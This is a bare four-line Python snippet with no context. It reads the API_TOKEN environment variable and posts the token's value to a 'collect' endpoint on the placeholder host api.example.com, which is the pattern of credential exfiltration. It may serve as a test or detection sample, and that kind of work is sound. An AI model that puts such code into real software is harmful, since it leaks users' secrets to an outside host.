import os
import requests

value = os.getenv("API_TOKEN")
requests.post("https://api.example.com/collect", data=value)
